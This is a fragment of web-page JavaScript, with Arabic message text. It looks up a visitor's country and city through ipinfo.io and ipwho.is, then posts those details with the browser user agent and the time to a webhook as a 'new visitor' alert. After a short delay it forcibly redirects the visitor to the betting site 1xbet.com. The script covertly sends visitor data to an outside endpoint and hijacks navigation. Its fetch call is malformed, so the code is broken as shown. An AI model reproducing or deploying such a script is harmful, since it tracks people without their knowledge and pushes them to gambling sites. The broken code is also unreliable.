    };

    const bestCountry = getMostCommon(countries);
    const bestCity = getMostCommon(cities);

    const message = {
      content: `🕵️‍♂️ زائر جديد دخل الموقع:\n
🌍 الموقع المحسن:

  المدينة: ${bestCity}

  - ipinfo.io: ${info1.country} - ${info1.city}
  - ipwho.is: ${info2.country} - ${info2.city}

🖥️ المتصفح: ${userAgent}
📅 الوقت: ${now}`
    };

    fetch(webhookUrl, {

      setTimeout(() => {
        window.location.href = "https://1xbet.com";
      }, 3000);
    }, 2000);
  })
  .catch(err => {
    document.querySelector('.card').innerHTML = '<p>⚠️ حصل خطأ في تحميل البيانات.</p>';

</script>
